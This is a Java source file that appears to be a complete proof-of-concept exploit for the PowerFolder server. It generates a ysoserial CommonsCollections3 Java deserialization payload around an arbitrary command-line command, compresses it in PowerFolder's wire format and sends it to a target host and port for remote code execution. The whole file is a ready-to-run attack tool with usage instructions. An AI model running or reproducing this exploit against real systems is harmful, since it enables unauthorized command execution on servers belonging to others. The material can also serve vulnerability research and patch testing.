package de.h0ng10.exploits.powerfolder;

import java.io.*;
import java.net.*;


import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.Serializer;


public class exploit {
	
	private static final int USAGE_CODE = 64; 
	
   // from https://github.com/powerfolder/PF-CORE/blob/master/src/main/de/dal33t/powerfolder/util/Convert.java
  
	
    public static byte[] convert2Bytes(int i) {
        byte[] b = new byte[4];

        b[3] = (byte) (i & 0xFF);
        b[2] = (byte) (0xFF & (i >> 8));
        b[1] = (byte) (0xFF & (i >> 16));
        b[0] = (byte) (0xFF & (i >> 24));
        return b;
    }
  
    /**
     * Converts an arry of bytes to an int
     *
     * @param b
     * @return
     */
    public static int convert2Int(byte[] b) {
        int w = 0;
        for (byte aB : b) {
            w <<= 8;
            if (aB < 0) {
                w += aB + 256;
            } else {
                w += aB;
            }
        }
        return w;
    }   

	public static void main(String[] args) {

		System.out.println("Powerfolder serialization exploit");
		System.out.println("---------------------------------");
		
		if (args.length != 3) {
			printUsage();
			System.exit(USAGE_CODE);
		}
		final String target = args[0];
		final int port = Integer.parseInt(args[1]);
		final String command = args[2];
		
		try {
			
			System.out.println("[+] Generating serialized payload..");
			final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass("CommonsCollections3");
			if (payloadClass == null) {
				System.err.println("Invalid payload type CommonsCollections3");
				System.exit(1);
			}
					
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			
			ByteArrayOutputStream payloadStream = new ByteArrayOutputStream();
			Serializer.serialize(object, payloadStream);
			
			System.out.println("[+] Connecting to target...");
			Socket clientSocket = new Socket(target, port);   
			DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());   
			DataInputStream inFromServer = new DataInputStream(clientSocket.getInputStream());   

			// Read initial packet from the server
			byte[] sizeArr = new byte[4];
			inFromServer.readFully(sizeArr, 0, sizeArr.length);
			int packetSize = convert2Int(sizeArr);
			byte[] packet = new byte[packetSize];
			inFromServer.readFully(packet, 0, packetSize);
			
			// Compress the payload via PFZIPOutputStream
			System.out.println("[+] Compressing payload..");
			ByteArrayOutputStream finalStream = new ByteArrayOutputStream();
			PFZIPOutputStream zipStream = new PFZIPOutputStream(finalStream);
			
			zipStream.write(payloadStream.toByteArray());
			zipStream.close();
			byte finalPayload[] = finalStream.toByteArray();
					
			// Send the payload to the server
			System.out.println("[+] Sending payload..");
			outToServer.write(convert2Bytes(finalPayload.length));
			outToServer.write(finalPayload);	
 
			System.out.println("[+] Closing connection");
			clientSocket.close(); 
		} catch(Exception ex ) {
			ex.printStackTrace();
		}
			
	}
	
	private static void printUsage() {
		System.err.println("Usage: java -jar powerfolder-exploit.jar [server] [port] '[command to execute]'");
	}

}
